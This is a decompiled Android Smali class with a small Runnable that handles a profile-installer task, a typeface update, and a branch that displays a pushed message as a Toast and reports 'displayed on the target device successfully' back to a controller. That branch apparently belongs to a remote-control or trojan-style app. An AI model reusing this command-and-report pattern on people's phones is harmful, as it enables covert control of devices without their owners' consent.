.class public final synthetic Lb/a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic j:I

.field public final synthetic k:Ljava/lang/Object;

.field public final synthetic l:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(Ljava/lang/Object;ILjava/lang/Object;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput p2, p0, Lb/a;->j:I

    .line 5
    .line 6
    iput-object p1, p0, Lb/a;->k:Ljava/lang/Object;

    .line 7
    .line 8
    iput-object p3, p0, Lb/a;->l:Ljava/lang/Object;

    .line 9
    .line 10
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 6

    .line 1
    iget v0, p0, Lb/a;->j:I

    .line 2
    .line 3
    const/4 v1, 0x0

    .line 4
    iget-object v2, p0, Lb/a;->l:Ljava/lang/Object;

    .line 5
    .line 6
    iget-object v3, p0, Lb/a;->k:Ljava/lang/Object;

    .line 7
    .line 8
    packed-switch v0, :pswitch_data_0

    .line 9
    .line 10
    .line 11
    check-cast v3, Landroidx/profileinstaller/ProfileInstallerInitializer;

    .line 12
    .line 13
    check-cast v2, Landroid/content/Context;

    .line 14
    .line 15
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 16
    .line 17
    .line 18
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 19
    .line 20
    const/16 v3, 0x1c

    .line 21
    .line 22
    if-lt v0, v3, :cond_0

    .line 23
    .line 24
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 25
    .line 26
    .line 27
    move-result-object v0

    .line 28
    invoke-static {v0}, Lc3/h;->a(Landroid/os/Looper;)Landroid/os/Handler;

    .line 29
    .line 30
    .line 31
    move-result-object v0

    .line 32
    goto :goto_0

    .line 33
    :cond_0
    new-instance v0, Landroid/os/Handler;

    .line 34
    .line 35
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 36
    .line 37
    .line 38
    move-result-object v3

    .line 39
    invoke-direct {v0, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 40
    .line 41
    .line 42
    :goto_0
    new-instance v3, Ljava/util/Random;

    .line 43
    .line 44
    invoke-direct {v3}, Ljava/util/Random;-><init>()V

    .line 45
    .line 46
    .line 47
    const/16 v4, 0x3e8

    .line 48
    .line 49
    const/4 v5, 0x1

    .line 50
    invoke-static {v4, v5}, Ljava/lang/Math;->max(II)I

    .line 51
    .line 52
    .line 53
    move-result v4

    .line 54
    invoke-virtual {v3, v4}, Ljava/util/Random;->nextInt(I)I

    .line 55
    .line 56
    .line 57
    move-result v3

    .line 58
    new-instance v4, Lc3/f;

    .line 59
    .line 60
    invoke-direct {v4, v2, v1}, Lc3/f;-><init>(Landroid/content/Context;I)V

    .line 61
    .line 62
    .line 63
    add-int/lit16 v3, v3, 0x1388

    .line 64
    .line 65
    int-to-long v1, v3

    .line 66
    invoke-virtual {v0, v4, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 67
    .line 68
    .line 69
    return-void

    .line 70
    :pswitch_0
    check-cast v3, Lo/n0;

    .line 71
    .line 72
    check-cast v2, Landroid/graphics/Typeface;

    .line 73
    .line 74
    iget-object v0, v3, Lo/n0;->c:Ljava/lang/Object;

    .line 75
    .line 76
    check-cast v0, Lo/o0;

    .line 77
    .line 78
    iget-object v1, v3, Lo/n0;->b:Ljava/lang/Object;

    .line 79
    .line 80
    check-cast v1, Ljava/lang/ref/WeakReference;

    .line 81
    .line 82
    iget-boolean v3, v0, Lo/o0;->k:Z

    .line 83
    .line 84
    if-eqz v3, :cond_1

    .line 85
    .line 86
    iput-object v2, v0, Lo/o0;->j:Landroid/graphics/Typeface;

    .line 87
    .line 88
    invoke-virtual {v1}, Ljava/lang/ref/Reference;->get()Ljava/lang/Object;

    .line 89
    .line 90
    .line 91
    move-result-object v1

    .line 92
    check-cast v1, Landroid/widget/TextView;

    .line 93
    .line 94
    if-eqz v1, :cond_1

    .line 95
    .line 96
    iget v0, v0, Lo/o0;->i:I

    .line 97
    .line 98
    invoke-virtual {v1, v2, v0}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 99
    .line 100
    .line 101
    :cond_1
    return-void

    .line 102
    :pswitch_1
    check-cast v3, Lb/g;

    .line 103
    .line 104
    check-cast v2, Ljava/lang/String;

    .line 105
    .line 106
    const-string v0, "this$0"

    .line 107
    .line 108
    invoke-static {v3, v0}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 109
    .line 110
    .line 111
    const-string v0, "$message"

    .line 112
    .line 113
    invoke-static {v2, v0}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 114
    .line 115
    .line 116
    iget-object v0, v3, Lb/g;->a:Landroid/content/Context;

    .line 117
    .line 118
    invoke-static {v0, v2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 119
    .line 120
    .line 121
    move-result-object v0

    .line 122
    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 123
    .line 124
    .line 125
    iget-object v0, v3, Lb/g;->f:Ljava/lang/String;

    .line 126
    .line 127
    invoke-static {v0}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    move-result-object v0

    .line 131
    const-string v1, "Your text message has been displayed on the target device successfully\n"

    .line 132
    .line 133
    invoke-virtual {v1, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 134
    .line 135
    .line 136
    move-result-object v0

    .line 137
    iget-object v1, v3, Lb/g;->b:Lc/b;

    .line 138
    .line 139
    invoke-virtual {v1, v0}, Lc/b;->a(Ljava/lang/String;)V

    .line 140
    .line 141
    .line 142
    return-void

    .line 143
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
